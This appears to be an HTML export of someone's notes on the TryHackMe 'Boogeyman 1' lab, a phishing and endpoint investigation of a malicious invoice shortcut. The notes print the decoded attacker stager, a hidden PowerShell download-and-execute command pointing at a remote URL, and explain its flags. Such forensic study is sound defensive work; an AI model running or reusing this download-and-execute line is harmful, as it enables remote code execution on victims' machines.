@@ -1,0 +1,698 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Boogeyman 1</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+	margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(50, 48, 44, 1);
+}
+.highlight-gray {
+	color: rgba(115, 114, 110, 1);
+	fill: rgba(115, 114, 110, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(205, 60, 58, 1);
+	fill: rgba(205, 60, 58, 1);
+}
+.highlight-default_background {
+	color: rgba(50, 48, 44, 1);
+}
+.highlight-gray_background {
+	background: rgba(248, 248, 247, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(248, 243, 252, 1);
+}
+.highlight-pink_background {
+	background: rgba(252, 241, 246, 1);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(115, 114, 110, 1);
+	fill: rgba(115, 114, 110, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(205, 60, 58, 1);
+	fill: rgba(205, 60, 58, 1);
+}
+.block-color-default_background {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray_background {
+	background: rgba(248, 248, 247, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(248, 243, 252, 1);
+}
+.block-color-pink_background {
+	background: rgba(252, 241, 246, 1);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-default { background-color: rgba(84, 72, 49, 0.08); }
+.select-value-color-gray { background-color: rgba(84, 72, 49, 0.15); }
+.select-value-color-brown { background-color: rgba(210, 162, 141, 0.35); }
+.select-value-color-orange { background-color: rgba(224, 124, 57, 0.27); }
+.select-value-color-yellow { background-color: rgba(236, 191, 66, 0.39); }
+.select-value-color-green { background-color: rgba(123, 183, 129, 0.27); }
+.select-value-color-blue { background-color: rgba(93, 165, 206, 0.27); }
+.select-value-color-purple { background-color: rgba(168, 129, 197, 0.27); }
+.select-value-color-pink { background-color: rgba(225, 136, 179, 0.27); }
+.select-value-color-red { background-color: rgba(244, 171, 159, 0.4); }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="2495b2cc-075b-803a-af2a-fa4dfd52d019" class="page sans"><header><div class="page-header-icon undefined"><img class="icon" src="https://tryhackme-images.s3.amazonaws.com/room-icons/5deeb1b1d851a202791d199d56778720.png"/></div><h1 class="page-title"><strong>Boogeyman 1</strong></h1><p class="page-description"></p></header><div class="page-body"><p id="2495b2cc-075b-8035-91fd-d53982143742" class="">In this room, you will be tasked to analyse the Tactics, Techniques, and Procedures (TTPs) executed by a threat group, from obtaining initial access until achieving its objective. </p><p id="2495b2cc-075b-8060-9992-c71385a5cc48" class="">For the investigation proper, you will be provided with the following artefacts:</p><ul id="2495b2cc-075b-80f9-a8cd-eaf0f41b3d38" class="bulleted-list"><li style="list-style-type:disc">Copy of the phishing email (dump.eml)</li></ul><ul id="2495b2cc-075b-8006-8a75-f3ba78573435" class="bulleted-list"><li style="list-style-type:disc">Powershell Logs from Julianne&#x27;s workstation (powershell.json)</li></ul><ul id="2495b2cc-075b-800d-b8dc-eecb31d5daf2" class="bulleted-list"><li style="list-style-type:disc">Packet capture from the same workstation (capture.pcapng)</li></ul><p id="2495b2cc-075b-803e-b50a-ed5f0caffc7e" class="">For the investigation proper, you will be provided with the following artefacts:</p><ul id="2495b2cc-075b-80a9-8c3c-c18676f5ca4e" class="bulleted-list"><li style="list-style-type:disc">Copy of the phishing email (dump.eml)</li></ul><ul id="2495b2cc-075b-8014-bb13-ddd47bd424da" class="bulleted-list"><li style="list-style-type:disc">Powershell Logs from Julianne&#x27;s workstation (powershell.json)</li></ul><ul id="2495b2cc-075b-80e7-ab9a-c8f57d38c9f9" class="bulleted-list"><li style="list-style-type:disc">Packet capture from the same workstation (capture.pcapng)</li></ul><p id="2495b2cc-075b-80d8-b007-de8973ef8d80" class="">
+</p><p id="2495b2cc-075b-8046-8367-c755370440a6" class="">Tools Available</p><ul id="2495b2cc-075b-8009-ac8c-ca42ed1d866b" class="bulleted-list"><li style="list-style-type:disc">Thunderbird - a free and open-source cross-platform email client.</li></ul><ul id="2495b2cc-075b-80a3-a99d-dac5e047e93d" class="bulleted-list"><li style="list-style-type:disc"><a href="https://github.com/Matmaus/LnkParse3">LNKParse3</a> - a python package for forensics of a binary file with LNK extension.</li></ul><ul id="2495b2cc-075b-807b-952b-f38e14d8e8d4" class="bulleted-list"><li style="list-style-type:disc">Wireshark - GUI-based packet analyser.</li></ul><ul id="2495b2cc-075b-80e9-8015-e0281138b45d" class="bulleted-list"><li style="list-style-type:disc">Tshark - CLI-based Wireshark.</li></ul><ul id="2495b2cc-075b-805e-84ba-ddc11cb7d106" class="bulleted-list"><li style="list-style-type:disc">jq - a lightweight and flexible command-line JSON processor.</li></ul><h2 id="2495b2cc-075b-806a-b719-f01dfd06da1a" class="">[Email Analysis] Look at that headers!</h2><p id="2495b2cc-075b-80d1-ab53-d2a7488a5601" class="">Julianne, a finance employee working for Quick Logistics LLC, received a follow-up email regarding an unpaid invoice from their business partner, B Packaging Inc. Unbeknownst to her, the attached document was malicious and compromised her workstation.</p><figure id="2495b2cc-075b-8072-847e-d9afbcc5f0b3" class="image"><a href="https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/28bbc4ff07b8ad16da155894ca3d2d73.png"><img style="width:672px" src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/28bbc4ff07b8ad16da155894ca3d2d73.png"/></a></figure><p id="2495b2cc-075b-800c-ab73-ce87810c6e3b" class="">The security team was able to flag the suspicious execution of the attachment, in addition to the phishing reports received from the other finance department employees, making it seem to be a targeted attack on the finance team. Upon checking the latest trends, the initial TTP used for the malicious attachment is attributed to the new threat group named Boogeyman, known for targeting the logistics sector.</p><p id="2495b2cc-075b-804e-8d38-cddceb7a7f36" class="">
+</p><ul id="2495b2cc-075b-80b4-aa79-c19d4a77340e" class="bulleted-list"><li style="list-style-type:disc">What is the name of the third-party mail relay service used by the attacker based on the DKIM-Signature and List-Unsubscribe headers?<br/><br/>From the headers, when I was going through i saw a DKIM signature for the following</li></ul><figure id="2495b2cc-075b-809d-9199-dc8364bdf8ba" class="image"><a href="A6830DE2-AA7D-4700-B730-399230D8B921.png"><img style="width:691.9833374023438px" src="A6830DE2-AA7D-4700-B730-399230D8B921.png"/></a></figure><ul id="2495b2cc-075b-80c6-ba96-eae02dbd7ad7" class="bulleted-list"><li style="list-style-type:disc">What is the name of the file inside the encrypted attachment?</li></ul><figure id="2495b2cc-075b-802f-964d-fdf7a47ca39a" class="image"><a href="7BA53696-CC72-4267-A1BF-3A704D243E63.png"><img style="width:497px" src="7BA53696-CC72-4267-A1BF-3A704D243E63.png"/></a></figure><ul id="2495b2cc-075b-80a1-a5f1-f07bd16a02bf" class="bulleted-list"><li style="list-style-type:disc">What is the password of the encrypted attachment?<br/>Its in the email itself</li></ul><ul id="2495b2cc-075b-805f-91aa-ebc17fbfd021" class="bulleted-list"><li style="list-style-type:disc">Based on the result of the lnkparse tool, what is the encoded payload found in the Command Line Arguments field?</li></ul><figure id="2495b2cc-075b-800d-8b84-d09db5332d5b" class="image"><a href="1DFA4D1A-F866-4D5D-9336-2FB671595CBF.png"><img style="width:2188px" src="1DFA4D1A-F866-4D5D-9336-2FB671595CBF.png"/></a></figure><figure id="2495b2cc-075b-80a6-a360-c892bd9e096f" class="image"><a href="DA0E95BE-8C95-43B3-A7C1-9078E1A513FD.png"><img style="width:2181px" src="DA0E95BE-8C95-43B3-A7C1-9078E1A513FD.png"/></a></figure><p id="2495b2cc-075b-8035-b34d-eb562e109ac7" class="">
+</p><h2 id="2495b2cc-075b-8068-b1e8-cca1a6b1e40e" class="">[Endpoint Security] Are you sure that’s an invoice?</h2><hr id="2495b2cc-075b-8096-afd9-cbba3bdad1b9"/><h3 id="2495b2cc-075b-8023-9738-f0231b3ae36b" class=""><strong>Key Findings</strong></h3><ol type="1" id="2495b2cc-075b-8007-bfc7-eca50cb63442" class="numbered-list" start="1"><li><strong>Target program</strong><p id="2495b2cc-075b-80f4-9c0d-f60b4b6b5125" class="">The shortcut does not point to a document.</p><p id="2495b2cc-075b-80dd-881e-e805ae5cbef4" class="">It launches:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2495b2cc-075b-80a4-bbfd-d05d17e92c54" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+</code></pre></li></ol><ol type="1" id="2495b2cc-075b-808e-a03f-d9ac03a75f39" class="numbered-list" start="2"><li><strong>Command-line arguments</strong><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2495b2cc-075b-804d-9f59-f4a04a49473a" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">-nop -windowstyle hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZ...
+</code></pre><ul id="2495b2cc-075b-80f0-be9c-f8d6b57691b9" class="bulleted-list"><li style="list-style-type:disc"><code>nop</code> → <em>No Profile</em>, disables PowerShell profiles (reduces logging).</li></ul><ul id="2495b2cc-075b-8085-a092-d9b9fbabb107" class="bulleted-list"><li style="list-style-type:disc"><code>windowstyle hidden</code> → hides the PowerShell window.</li></ul><ul id="2495b2cc-075b-805d-b16e-f9c91d2cbb02" class="bulleted-list"><li style="list-style-type:disc"><code>enc &lt;base64&gt;</code> → runs a Base64-encoded script (classic obfuscation).</li></ul></li></ol><ol type="1" id="2495b2cc-075b-80ac-9cb5-f210298ffa24" class="numbered-list" start="3"><li><strong>Base64 payload meaning</strong><p id="2495b2cc-075b-807d-b245-cc02cb5e28eb" class="">Decoding this string:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2495b2cc-075b-80e9-98d4-c376126af405" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">iex (new-object net.webclient).downloadstring(&#x27;http://files.bpakcaging.xyz/update&#x27;)
+</code></pre><p id="2495b2cc-075b-8014-84d2-edc19973ab25" class="">→ This executes whatever PowerShell script is hosted at that URL — classic <strong>initial stager</strong>.</p></li></ol><ol type="1" id="2495b2cc-075b-80e7-8af3-dbd4760f974f" class="numbered-list" start="4"><li><strong>Persistence disguise</strong><ul id="2495b2cc-075b-8042-90cb-da1dd0b315ea" class="bulleted-list"><li style="list-style-type:disc">Description: <code>Invoice Jan 2023</code> (social engineering).</li></ul><ul id="2495b2cc-075b-8083-823b-eda749ecb715" class="bulleted-list"><li style="list-style-type:disc">Icon location: <code>excel.ico</code> (to mimic an Excel file).</li></ul></li></ol><hr id="2495b2cc-075b-80ec-871f-edb2aa74ed2a"/><h3 id="2495b2cc-075b-8089-9c85-cae836446a6a" class=""><strong>What actually happens when clicked</strong></h3><ul id="2495b2cc-075b-8083-9f24-cee842d85315" class="bulleted-list"><li style="list-style-type:disc">User double-clicks <code>Invoice_20230103.lnk</code>.</li></ul><ul id="2495b2cc-075b-8058-91fb-ff8e81930173" class="bulleted-list"><li style="list-style-type:disc">It silently runs hidden PowerShell.</li></ul><ul id="2495b2cc-075b-80db-bcbf-e516cc524403" class="bulleted-list"><li style="list-style-type:disc">PowerShell downloads and executes code from:<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2495b2cc-075b-800b-a789-d5d54d08204a" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">http://files.bpakcaging.xyz/update
+</code></pre></li></ul><ul id="2495b2cc-075b-80ae-a983-ce985270b372" class="bulleted-list"><li style="list-style-type:disc">That code could be a loader, RAT, ransomware, etc.</li></ul><hr id="2495b2cc-075b-8012-bcef-f2cc9db5c349"/><p id="2495b2cc-075b-80fb-a571-f969b21c83cc" class="">
